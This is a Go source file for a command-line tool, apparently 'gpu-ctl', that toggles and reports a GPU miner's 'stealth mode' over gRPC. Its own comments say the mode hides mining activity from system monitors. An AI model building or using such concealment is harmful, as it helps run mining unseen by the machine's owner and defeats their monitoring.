// Package cli - Stealth command implementation
// Stealth: Toggle stealth mode configuration
package cli

import (
	"context"
	"fmt"
	"time"

	"github.com/opus-gpu/gpu-tools/internal/client"
	"github.com/spf13/cobra"
)

var stealthCmd = &cobra.Command{
	Use:   "stealth [enable|disable]",
	Short: "Toggle stealth mode",
	Long: `Enable hoặc disable stealth mode của miner.
Stealth mode ẩn GPU mining activity khỏi system monitors.`,
	Example: `  gpu-ctl stealth enable
  gpu-ctl stealth disable
  gpu-ctl stealth status`,
	Args: cobra.ExactArgs(1),
	ValidArgs: []string{"enable", "disable", "status"},
	RunE: func(cmd *cobra.Command, args []string) error {
		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
		defer cancel()

		grpcAddr := rootCmd.PersistentFlags().Lookup("grpc-addr").Value.String()
		grpcClient, err := client.NewGRPCClient(grpcAddr)
		if err != nil {
			return fmt.Errorf("failed to create gRPC client: %w", err)
		}
		defer grpcClient.Close()

		action := args[0]

		switch action {
		case "enable":
			if err := grpcClient.EnableStealth(ctx); err != nil {
				return fmt.Errorf("failed to enable stealth mode: %w", err)
			}
			fmt.Println("✓ Stealth mode enabled")

		case "disable":
			if err := grpcClient.DisableStealth(ctx); err != nil {
				return fmt.Errorf("failed to disable stealth mode: %w", err)
			}
			fmt.Println("✓ Stealth mode disabled")

		case "status":
			status, err := grpcClient.GetStealthStatus(ctx)
			if err != nil {
				return fmt.Errorf("failed to get stealth status: %w", err)
			}
			fmt.Printf("Stealth mode: %s\n", formatStealthStatus(status))

		default:
			return fmt.Errorf("invalid action: %s (use enable/disable/status)", action)
		}

		return nil
	},
}

// formatStealthStatus - Format stealth status (status formatting – định dạng trạng thái)
func formatStealthStatus(enabled bool) string {
	if enabled {
		return "✓ Enabled"
	}
	return "✗ Disabled"
}
